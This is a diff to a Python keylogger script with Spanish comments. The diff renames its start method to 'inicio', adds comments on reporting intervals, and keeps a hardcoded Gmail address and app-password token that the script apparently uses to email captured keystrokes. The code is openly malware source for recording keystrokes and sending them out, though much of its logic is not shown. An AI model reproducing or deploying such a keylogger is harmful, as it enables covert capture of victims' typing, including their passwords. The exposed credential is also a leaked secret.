@@ -6,8 +6,10 @@ import smtplib  # Libreria para enviar correo
 import ssl
 
 ctx = ssl.create_default_context()
-
-PERIODO_ENVIO = 6  # in seconds, 60 means 1 minute and so on
+# cada minuto 60
+# cada dia 86400
+# cada semana 604800
+PERIODO_ENVIO = 6
 CORREO = "leomir2656@gmail.com"
 TOKEN = "lqcuadiizlyygavn"
 
@@ -64,7 +66,7 @@ class Keylogger:
         # Reinicio del contador del periodo de tiempo
         timer.start()
 
-    def start(self):
+    def inicio(self):
         # Obtiene la fecha de ejecucion
         self.start_dt = datetime.now()
         # Ejecuta el Keyloger en caso de usar el teclado
@@ -72,7 +74,7 @@ class Keylogger:
         # Funcion para almacenar el escaneo en el mensaje
         self.reporte()
         # Mensaje de ejecucion
-        print(f"{datetime.now()} - Started keylogger")
+        print(f"{datetime.now()} - Inicio ")
         # Espera a que el proceso se termine manualmente o sino sigue en ejecucion
         keyboard.wait()
 
@@ -80,4 +82,4 @@ class Keylogger:
 if __name__ == "__main__":
     #Creacion del Keylogger
     keylogger = Keylogger(periodo_envio=PERIODO_ENVIO)
-    keylogger.start()
+    keylogger.inicio()
